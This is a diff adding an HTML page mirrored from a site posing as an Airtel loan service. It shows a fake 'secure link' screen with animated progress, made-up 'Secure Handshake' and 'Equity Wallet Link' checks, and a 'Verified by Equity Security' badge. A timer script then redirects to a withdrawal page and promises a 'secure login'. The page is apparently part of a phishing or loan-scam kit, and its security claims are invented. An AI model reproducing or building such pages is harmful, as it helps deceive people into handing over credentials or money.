@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from airtelloans.netlify.app/processing.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:23:56 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #fdfdfd;
+            overflow: hidden;
+        }
+        /* Smart Progress Bar */
+        
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: #f1f1f1;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #ce1e2d;
+            border-radius: 10px;
+            transition: width 0.4s cubic-bezier(0.1, 0.7, 1.0, 0.1);
+        }
+        /* Float Animation for Logo */
+        
+        .float {
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%,
+            100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+        /* Text Slide Up */
+        
+        .slide-up {
+            animation: slideUp 0.5s ease-out forwards;
+            opacity: 0;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* Success Pulse */
+        
+        .check-glow {
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col items-center justify-center p-8">
+
+    <div class="w-full max-w-sm flex flex-col items-center">
+        <div class="relative mb-12">
+            <div class="w-20 h-20 bg-red-600 rounded-[22px] flex items-center justify-center text-white font-bold text-4xl italic float shadow-2xl shadow-red-200 z-10 relative">
+                a
+            </div>
+            <div class="absolute inset-0 w-20 h-20 border-2 border-red-100 rounded-[22px] animate-ping opacity-20"></div>
+        </div>
+
+        <div class="text-center mb-8 h-12">
+            <h2 id="statusTitle" class="text-lg font-bold text-gray-900 slide-up">Initializing Secure Link</h2>
+            <p id="statusSub" class="text-sm text-gray-400 mt-1 slide-up">Awaiting Equity Money response...</p>
+        </div>
+
+        <div class="w-full px-4 mb-10">
+            <div class="progress-container mb-3">
+                <div id="bar" class="progress-bar"></div>
+            </div>
+            <div class="flex justify-between items-center">
+                <span id="percent" class="text-[10px] font-bold text-red-600 uppercase tracking-widest">0%</span>
+                <span class="text-[10px] font-bold text-gray-300 uppercase tracking-widest">Encrypted</span>
+            </div>
+        </div>
+
+        <div class="w-full space-y-4 bg-gray-50 p-6 rounded-3xl border border-gray-100">
+            <div class="flex items-center justify-between">
+                <p class="text-xs font-semibold text-gray-600">Secure Handshake</p>
+                <div id="check1" class="w-5 h-5 rounded-full border-2 border-gray-200 flex items-center justify-center transition-all duration-300">
+                    <div class="w-2 h-2 rounded-full bg-gray-200"></div>
+                </div>
+            </div>
+            <div class="flex items-center justify-between">
+                <p class="text-xs font-semibold text-gray-600">Equity Wallet Link</p>
+                <div id="check2" class="w-5 h-5 rounded-full border-2 border-gray-200 flex items-center justify-center transition-all duration-300">
+                    <div class="w-2 h-2 rounded-full bg-gray-200"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-auto pb-8">
+        <div class="flex items-center gap-2">
+            <svg class="w-3 h-3 text-green-500" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 4.925-3.467 9.47-8 10.655-4.533-1.18-8-5.73-8-10.655 0-.68.056-1.35.166-2.001zm8 10.655c3.53-1.012 6.503-4.766 6.503-8.654 0-.556-.04-1.1-.116-1.63a10.142 10.142 0 01-6.387-2.766 10.142 10.142 0 01-6.387 2.766 10.142 10.142 0 01-.116 1.63c0 3.888 2.973 7.642 6.503 8.654z" clip-rule="evenodd"/>
+            </svg>
+            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-tighter">Verified by Equity Security</p>
+        </div>
+    </footer>
+
+    <script>
+        const bar = document.getElementById('bar');
+        const percent = document.getElementById('percent');
+        const title = document.getElementById('statusTitle');
+        const sub = document.getElementById('statusSub');
+
+        const phases = [{
+            p: 25,
+            t: "Verifying Device",
+            s: "Checking security protocols...",
+            c1: true
+        }, {
+            p: 60,
+            t: "Linking Wallet",
+            s: "Connecting to Equity Money...",
+            c2: true
+        }, {
+            p: 100,
+            t: "Connection Ready",
+            s: "Redirecting to secure login...",
+            done: true
+        }];
+
+        function updateStep(checkId) {
+            const el = document.getElementById(checkId);
+            el.innerHTML = '<svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>';
+            el.classList.replace('border-gray-200', 'bg-green-500');
+            el.classList.add('border-green-500', 'check-glow');
+        }
+
+        phases.forEach((phase, index) => {
+            setTimeout(() => {
+                bar.style.width = phase.p + '%';
+                percent.innerText = phase.p + '%';
+                title.innerText = phase.t;
+                sub.innerText = phase.s;
+
+                if (phase.c1) updateStep('check1');
+                if (phase.c2) updateStep('check2');
+
+                if (phase.done) {
+                    setTimeout(() => {
+                        window.location.href = 'withdraw.html';
+                    }, 1000);
+                }
+            }, index * 1800);
+        });
+    </script>
+</body>
+
+<!-- Mirrored from airtelloans.netlify.app/processing.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:23:57 GMT -->
+
+</html>
